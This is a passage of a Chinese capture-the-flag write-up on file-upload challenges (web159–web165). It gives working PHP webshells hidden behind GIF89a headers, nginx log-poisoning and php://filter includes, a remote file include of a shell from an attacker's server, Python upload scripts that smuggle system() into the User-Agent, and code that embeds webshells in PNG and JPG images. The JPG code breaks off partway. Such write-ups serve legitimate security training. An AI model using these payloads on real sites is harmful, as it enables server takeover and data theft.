data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'tac /var/l'</span><span class="token operator">.</span><span class="token string single-quoted-string">'og/nginx/access.l'</span><span class="token operator">.</span><span class="token string single-quoted-string">'og'</span><span class="token delimiter important">?></span></span></code></pre><h4 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h4><p>ban‰∫Ü()Ôºå‰ΩÜÊòØÂèØ‰ª•‰ΩøÁî®ÂèçÂºïÂè∑Áõ¥Êé•ÊâßË°åÂëΩ‰ª§ÔºåÊàñËÄÖ‰πãÂâçÁöÑnginxÊó•ÂøóÊ≥®ÂÖ•</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'/var/lo'</span><span class="token operator">.</span><span class="token string single-quoted-string">'g/nginx/access.l'</span><span class="token operator">.</span><span class="token string single-quoted-string">'og'</span><span class="token delimiter important">?></span></span></code></pre><h4 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h4><p>Á©∫Ê†ºÔºåÂèçÂºïÂè∑Ë¢´ban‰∫Ü</p><p>Á™ÅÁ†¥Á©∫Ê†ºËøáÊª§ÂèØ‰ª•Áî®Êç¢Ë°åÁ¨¶%0a</p><p>ÂèØ‰ª•ÁªßÁª≠Êó•ÂøóÊ≥®ÂÖ•ÊàñËÄÖphp‰º™ÂçèËÆÆ</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">include</span><span class="token string double-quoted-string">"ph"</span><span class="token operator">.</span><span class="token string double-quoted-string">"p://filter/convert.base64-encode/resource=../flag.p"</span><span class="token operator">.</span><span class="token string double-quoted-string">"hp"</span><span class="token delimiter important">?></span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">include</span><span class="token string double-quoted-string">"/var/lo"</span><span class="token operator">.</span><span class="token string double-quoted-string">"g/nginx/access.lo"</span><span class="token operator">.</span><span class="token string double-quoted-string">"g"</span><span class="token delimiter important">?></span></span></code></pre><h4 id="web161-‰º™ÈÄ†ÂõæÁâáÂ§¥GIF89a"><a href="#web161-‰º™ÈÄ†ÂõæÁâáÂ§¥GIF89a" class="headerlink" title="web161(‰º™ÈÄ†ÂõæÁâáÂ§¥GIF89a)"></a>web161(‰º™ÈÄ†ÂõæÁâáÂ§¥GIF89a)</h4><p>Â¢ûÂä†‰∫ÜÂØπÂõæÁâáÂ§¥ÁöÑËØÜÂà´ÔºåÁî®‰∫Ügetimagesize()ËøõË°åÊ£ÄÊµã</p><p>getimagesize(): ‰ºöÂØπÁõÆÊ†áÊñá‰ª∂ÁöÑ16ËøõÂà∂ÂéªËøõË°å‰∏Ä‰∏™ËØªÂèñÔºåÂéªËØªÂèñÂ§¥Âá†‰∏™Â≠óÁ¨¶‰∏≤ÊòØ‰∏çÊòØÁ¨¶ÂêàÂõæÁâáÁöÑË¶ÅÊ±Ç</p><p>iniÈóÆ‰ª∑Âíå‰∏ÄÂè•ËØùÊú®È©¨ÂâçÈÉΩË¶ÅÂä†‰∏ÄÂè•GIF89aÔºåÊàñËÄÖÊîπÊàêpngÊñá‰ª∂Â§¥89 50 4E 47</p><pre class="language-php" data-language="php"><code class="language-php">GIF89a<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span></code></pre><h4 id="web162-Êù°‰ª∂Á´û‰∫â-ËøúÁ®ãÊñá‰ª∂ÂåÖÂê´"><a href="#web162-Êù°‰ª∂Á´û‰∫â-ËøúÁ®ãÊñá‰ª∂ÂåÖÂê´" class="headerlink" title="web162(Êù°‰ª∂Á´û‰∫â ËøúÁ®ãÊñá‰ª∂ÂåÖÂê´)"></a>web162(Êù°‰ª∂Á´û‰∫â ËøúÁ®ãÊñá‰ª∂ÂåÖÂê´)</h4><p>ÂÜÖÂÆπban‰∫Ü<code>.</code>‰πãÂâçÊñπÊ≥ïÂ∞±‰∏çË°å‰∫ÜÔºåÂèØ‰ª•ÂåÖÂê´<code>/tmp/sess_&#123;sessid&#125;</code>ËøõË°åÊù°‰ª∂Á´û‰∫â</p><p>‰πüÂèØ‰ª•ËøõË°åËøúÁ®ãÊñá‰ª∂ÂåÖÂê´</p><ol><li><p>Â∞ÜÊú®È©¨‰∏ä‰º†Ëá≥ËøúÁ®ãÊúçÂä°Âô®ÔºåÁî±‰∫éËøáÊª§‰∫Ü. ÊâÄ‰ª•ÈúÄË¶ÅËΩ¨Êç¢‰∏ãÔºåmm</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>ÊàñËÄÖ<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat ../f*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre></li><li><p>‰∏ä‰º†ÂåÖÂê´Êñá‰ª∂ .user.ini</p><pre class="language-ini" data-language="ini"><code class="language-ini">GIF89a<span class="token key attr-name">auto_prepend_file</span><span class="token punctuation">=</span><span class="token value attr-value">txt</span></code></pre></li><li><p>‰∏ä‰º†ËøúÁ®ãË∞ÉÁî®Êñá‰ª∂ txt <a href="https://www.bejson.com/convert/ip2int/">IPËΩ¨Êï∞Â≠ó</a></p><pre class="language-php" data-language="php"><code class="language-php">GIF89a<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">include</span><span class="token string double-quoted-string">"http://Êï∞Â≠óIP/mm"</span><span class="token delimiter important">?></span></span></code></pre></li><li><p>ËÆøÈóÆupload</p></li></ol><p><strong>‰ΩÜÊòØÊàëÂú®Â∞ùËØïÁöÑÊó∂ÂÄôÔºåÊÄªÊòØËøîÂõû400üòÖ</strong></p><p>‰∫éÊòØÁúãÂà∞‰∫ÜÂè¶‰∏Ä‰∏™ÈùûÈ¢ÑÊúüÔºåÈÄöËøáÂºÇÊàñÁºñÁ†ÅÁªïËøáËøôÈáå‰∏çËÉΩÁõ¥Êé•Áî® python ÁöÑ urllib.parse.unquote ÂáΩÊï∞ÁºñÁ†ÅÂèÇÊï∞ÔºåÈúÄË¶ÅËá™Ë°åÂÜô‰∏Ä‰∏™ int2byte </p><p>ÁöÑÂáΩÊï∞ÔºåËøôÈáåÈÅáÂà∞‰∏™Âùë„ÄÇ</p><p>È°∫Â∏¶Áî® python ÂÆûÁé∞‰∫Ü‰∏ã php ‰∏≠ÂØπÂ≠óÁ¨¶‰∏≤ÁöÑÂèñÂèçÔºåÂÖ∂ÂÆûÂ∞±ÊòØ <code>255 - Â≠óÁ¨¶ÁöÑascii</code> ÂæóÂà∞ÁöÑ ascii ÂèñÂ≠óÁ¨¶„ÄÇ‰∫éÊòØÂ∞±Êúâ‰∫ÜÂ¶Ç‰∏ãËÑöÊú¨„ÄÇ</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">str2neg_bytes</span><span class="token punctuation">(</span>target<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token operator">-</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'big'</span><span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> target<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"/var/log/nginx/access.log"</span>file_content <span class="token operator">=</span> <span class="token string">"&lt;?=include~"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> str2neg_bytes<span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"?>"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>burp0_url <span class="token operator">=</span> <span class="token string">"https://f0c1c895-2920-42b8-8f40-cff4a3a610b3.challenge.ctf.show/upload.php"</span>burp0_headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Accept"</span><span class="token punctuation">:</span> <span class="token string">"application/json, text/javascript, */*; q=0.01"</span><span class="token punctuation">,</span> <span class="token string">"X-Requested-With"</span><span class="token punctuation">:</span> <span class="token string">"XMLHttpRequest"</span><span class="token punctuation">,</span> <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 &lt;?=system('tac ../fla*');?>"</span><span class="token punctuation">,</span> <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"multipart/form-data; boundary=----WebKitFormBoundaryv0k4Ho2WfgKjvEM4"</span><span class="token punctuation">,</span> <span class="token string">"Accept-Encoding"</span><span class="token punctuation">:</span> <span class="token string">"gzip, deflate"</span><span class="token punctuation">,</span> <span class="token string">"Accept-Language"</span><span class="token punctuation">:</span> <span class="token string">"zh-CN,zh;q=0.9"</span><span class="token punctuation">,</span> <span class="token string">"Connection"</span><span class="token punctuation">:</span> <span class="token string">"close"</span><span class="token punctuation">&#125;</span>burp0_data <span class="token operator">=</span> <span class="token string">"------WebKitFormBoundaryv0k4Ho2WfgKjvEM4\r\nContent-Disposition: form-data; name=\"file\"; filename=\"file\"\r\nContent-Type: image/png\r\n\r\nGIF78a\r\n"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> file_content <span class="token operator">+</span> <span class="token string">"\r\n\r\n\r\n------WebKitFormBoundaryv0k4Ho2WfgKjvEM4--\r\n"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>burp0_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>burp0_headers<span class="token punctuation">,</span> data<span class="token operator">=</span>burp0_data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>file_content<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><h4 id="web163"><a href="#web163" class="headerlink" title="web163"></a>web163</h4><p>‰∏ä‰º†ÂõæÁâáÂêéÔºå‰ºöË¢´Âà†Èô§ÔºåÊâÄ‰ª•ÈúÄË¶ÅÂú®‰∏ä‰º†ÁöÑÁû¨Èó¥ÔºåÂ∞±postÂëΩ‰ª§ÊâßË°åÔºåËøòÂèØ‰ª•Áõ¥Êé•Âú®ÈÖçÁΩÆÊñá‰ª∂ÈáåËøúÁ®ãÂåÖÂê´ÔºåÁÑ∂ÂêéËÆøÈóÆ&#x2F;upload&#x2F;index.php„ÄÇ</p><p>ËøôÊ†∑Â∞±‰∏çÁî®Âç≥Êó∂Âéªpost‰∫Ü„ÄÇÔºàËøô‰∏™Ë¶ÅÊ±ÇÊúçÂä°Âô®ÂºÄÂêØ‰∫ÜËøúÁ®ãÂåÖÂê´ÈÄâÈ°πÔºâ</p><p>ÂêåÊ†∑‰πüÂèØ‰ª•‰ΩøÁî®‰∏äÈù¢ËÑöÊú¨</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">str2neg_bytes</span><span class="token punctuation">(</span>target<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token operator">-</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'big'</span><span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> target<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"php://filter/convert.base64-encode/resource=/var/www/html/flag.php"</span>file_content <span class="token operator">=</span> <span class="token string">"&lt;?=include~"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> str2neg_bytes<span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"?>"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>burp0_url <span class="token operator">=</span> <span class="token string">"https://ff4fcc76-8205-41ea-a4ba-52f257147647.challenge.ctf.show/upload.php"</span>burp0_headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Accept"</span><span class="token punctuation">:</span> <span class="token string">"application/json, text/javascript, */*; q=0.01"</span><span class="token punctuation">,</span> <span class="token string">"X-Requested-With"</span><span class="token punctuation">:</span> <span class="token string">"XMLHttpRequest"</span><span class="token punctuation">,</span> <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"</span><span class="token punctuation">,</span> <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"multipart/form-data; boundary=----WebKitFormBoundaryv0k4Ho2WfgKjvEM4"</span><span class="token punctuation">,</span> <span class="token string">"Accept-Encoding"</span><span class="token punctuation">:</span> <span class="token string">"gzip, deflate"</span><span class="token punctuation">,</span> <span class="token string">"Accept-Language"</span><span class="token punctuation">:</span> <span class="token string">"zh-CN,zh;q=0.9"</span><span class="token punctuation">,</span> <span class="token string">"Connection"</span><span class="token punctuation">:</span> <span class="token string">"close"</span><span class="token punctuation">&#125;</span>burp0_data <span class="token operator">=</span> <span class="token string">"------WebKitFormBoundaryv0k4Ho2WfgKjvEM4\r\nContent-Disposition: form-data; name=\"file\"; filename=\"file\"\r\nContent-Type: image/png\r\n\r\nGIF78a\r\n"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> file_content <span class="token operator">+</span> <span class="token string">"\r\n\r\n\r\n------WebKitFormBoundaryv0k4Ho2WfgKjvEM4--\r\n"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>burp0_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>burp0_headers<span class="token punctuation">,</span> data<span class="token operator">=</span>burp0_data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>file_content<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><h4 id="web164-pngÂõæÁâá‰∫åÊ¨°Ê∏≤Êüì"><a href="#web164-pngÂõæÁâá‰∫åÊ¨°Ê∏≤Êüì" class="headerlink" title="web164(pngÂõæÁâá‰∫åÊ¨°Ê∏≤Êüì)"></a>web164(pngÂõæÁâá‰∫åÊ¨°Ê∏≤Êüì)</h4><p>Ëøô‰∏ÄÂÖ≥ËÄÉÂØüpngÂõæÁâá‰∫åÊ¨°Ê∏≤ÊüìÔºåÁªèËøá‰∏ä‰º†ÂõæÁâáÂêéÂÜçÊ¨°Â∞ÜÂõæÁâá‰∏ãËΩΩ‰∏ãÊù•ÁªèËøáÂØπÊØîÔºå‰ΩøÁî®010editorÂèëÁé∞ÁªèËøá‰∫Ü‰∫åÊ¨°Ê∏≤ÊüìÔºåÂæàÂ§öÂú∞ÊñπÁöÑÊï∞ÊçÆÈÉΩ</p><p>‰∏ç‰∏ÄÊ†∑‰∫Ü</p><blockquote><p>ÊâÄË∞ì‰∫åÊ¨°Ê∏≤ÊüìÔºåÂ∞±ÊòØÁΩëÁ´ôÂ∞ÜÁî®Êà∑ÊâÄ‰∏ä‰º†ÁöÑÊñá‰ª∂ÔºåÁî±‰∫éÂêÑÁßçÂéüÂõ†ÔºàÈÄÇÈÖçÁΩëÁ´ôÊòæÁ§∫ÔºåÈò≤Ê≠¢Êú®È©¨ÔºâÁ≠âÔºåÂ∞ÜÊñá‰ª∂‰∏≠ÁöÑÊï∞ÊçÆËøõË°å‰øÆÊîπÔºåÂØπ‰∫åÊ¨°Ê∏≤</p><p>ÊüìÁöÑÁªïËøáÂç≥Â∞ÜÊ∫êÊñá‰ª∂‰∏é‰∏ä‰º†‰πãÂêéÁöÑÊñá‰ª∂ËøõË°åÂØπÊØîÔºåÊâæÂá∫Ê≤°ÊúâÂèëÁîüÂèòÂåñÁöÑÊï∞ÊçÆ‰ΩçÁΩÆÔºåÂ∞ÜÂêéÈó®‰ª£Á†ÅÊèíÂÖ•Ê≤°ÊúâÂèëÁîüÂèòÂåñÁöÑÊï∞ÊçÆÁöÑ‰ΩçÁΩÆ„ÄÇÂØπ‰∫é</p><p>ÁªïËøá‰∫åÊ¨°Ê∏≤ÊüìÔºå‰∫∫Â∑•ÁªïËøáÂá†‰πé‰∏çÂèØËÉΩÔºåËøôÂ∞±ÈúÄË¶Å‰ΩøÁî®ËÑöÊú¨Êù•ËøõË°åÊûÑÂª∫ÂõæÁâáÈ©¨„ÄÇ</p></blockquote><p>Êüê‰∏çÁü•Âêç‰Ω¨ÂÜôÁöÑ‰ª£Á†Å,ÂèÇËÄÉ<a href="https://blog.csdn.net/qq_46918279/article/details/120575503">CTFSHOW-Êñá‰ª∂‰∏ä‰º†</a></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$p</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">0xa3</span><span class="token punctuation">,</span> <span class="token number">0x9f</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0xf7</span><span class="token punctuation">,</span> <span class="token number">0x0e</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0x1b</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">,</span>           <span class="token number">0xbe</span><span class="token punctuation">,</span> <span class="token number">0x2c</span><span class="token punctuation">,</span> <span class="token number">0x8a</span><span class="token punctuation">,</span> <span class="token number">0xd0</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0xf9</span><span class="token punctuation">,</span> <span class="token number">0xe1</span><span class="token punctuation">,</span> <span class="token number">0xae</span><span class="token punctuation">,</span>           <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0xf6</span><span class="token punctuation">,</span> <span class="token number">0xd9</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x5d</span><span class="token punctuation">,</span> <span class="token number">0xfb</span><span class="token punctuation">,</span> <span class="token number">0xae</span><span class="token punctuation">,</span> <span class="token number">0xcc</span><span class="token punctuation">,</span>           <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xdc</span><span class="token punctuation">,</span> <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xdc</span><span class="token punctuation">,</span> <span class="token number">0xa3</span><span class="token punctuation">,</span> <span class="token number">0x9f</span><span class="token punctuation">,</span>           <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0xa5</span><span class="token punctuation">,</span> <span class="token number">0xbe</span><span class="token punctuation">,</span> <span class="token number">0x5f</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x4c</span><span class="token punctuation">,</span>           <span class="token number">0xa1</span><span class="token punctuation">,</span> <span class="token number">0x3f</span><span class="token punctuation">,</span> <span class="token number">0x7a</span><span class="token punctuation">,</span> <span class="token number">0xbf</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x6b</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0x2d</span><span class="token punctuation">,</span>           <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x7d</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x9d</span><span class="token punctuation">,</span> <span class="token number">0xad</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0xa1</span><span class="token punctuation">,</span>           <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token variable">$img</span> <span class="token operator">=</span> <span class="token function">imagecreatetruecolor</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$y</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$y</span> <span class="token operator">&lt;</span> <span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$y</span> <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token variable">$r</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$y</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token variable">$g</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$y</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$y</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token variable">$color</span> <span class="token operator">=</span> <span class="token function">imagecolorallocate</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token variable">$r</span><span class="token punctuation">,</span> <span class="token variable">$g</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">imagesetpixel</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token function">round</span><span class="token punctuation">(</span><span class="token variable">$y</span> <span class="token operator">/</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$color</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token function">imagepng</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'1.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//Ë¶Å‰øÆÊîπÁöÑÂõæÁâáÁöÑË∑ØÂæÑ</span> <span class="token comment">/* Êú®È©¨ÂÜÖÂÆπ&lt;?$_GET[0]($_POST[1]);?> */</span><span class="token comment">//imagepng($img,'1.png');  Ë¶Å‰øÆÊîπÁöÑÂõæÁâáÁöÑË∑ØÂæÑ,1.pngÊòØ‰ΩøÁî®ÁöÑÊñá‰ª∂ÔºåÂèØ‰ª•‰∏çÂ≠òÂú®</span><span class="token comment">//‰ºöÂú®ÁõÆÂΩï‰∏ãËá™Âä®ÂàõÂª∫‰∏Ä‰∏™1.pngÂõæÁâá</span><span class="token comment">//ÂõæÁâáËÑöÊú¨ÂÜÖÂÆπÔºö$_GET[0]($_POST[1]);</span><span class="token comment">//‰ΩøÁî®ÊñπÊ≥ïÔºö‰æãÂ≠êÔºöÊü•ÁúãÂõæÁâáÔºåget‰º†ÂÖ•0=systemÔºõpost‰º†ÂÖ•tac flag.php</span> <span class="token delimiter important">?></span></span>------------------------------------           ÂàõÂª∫1.pngÂõæÁâáÊàêÂäüÔºÅ      ------------------------------------</code></pre><p><img src="web164.png" loading="lazy"></p><h4 id="web165-jpg‰∫åÊ¨°Ê∏≤Êüì"><a href="#web165-jpg‰∫åÊ¨°Ê∏≤Êüì" class="headerlink" title="web165(jpg‰∫åÊ¨°Ê∏≤Êüì)"></a>web165(jpg‰∫åÊ¨°Ê∏≤Êüì)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token comment">/*    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().    It is necessary that the size and quality of the initial image are the same as those of the processed image.    1) Upload an arbitrary image via secured files upload script    2) Save the processed image and launch:    jpg_payload.php &lt;jpg_name.jpg>    In case of successful injection you will get a specially crafted image, which should be uploaded again.    Since the most straightforward injection method is used, the following problems can occur:    1) After the second processing the injected data may become partially corrupted.    2) The jpg_payload.php script outputs "Something's wrong".    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.    Sergey Bobrov @Black2Fan.    See also:    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/    */</span>    <span class="token variable">$miniPayload</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;?=eval(\$_POST[7]);?>"</span><span class="token punctuation">;</span> <span class="token comment">//Ê≥®ÊÑè$ËΩ¨‰πâ</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">extension_loaded</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'gd'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'imagecreatefromjpeg'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php-gd is not installed'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php jpg_payload.php &lt;jpg_name.jpg>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">set_error_handler</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"custom_error_handler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$pad</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$pad</span> <span class="token operator">&lt;</span> <span class="token number">1024</span><span class="token punctuation">;</span> <span class="token variable">$pad</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$nullbytePayloadSize</span> <span class="token operator">=</span> <span class="token variable">$pad</span><span class="token punctuation">;</span>        <span class="token variable">$dis</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataInputStream</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$outStream</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$extraBytes</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token variable">$correctImage</span> <span class="token operator">=</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readShort</span><span class="token 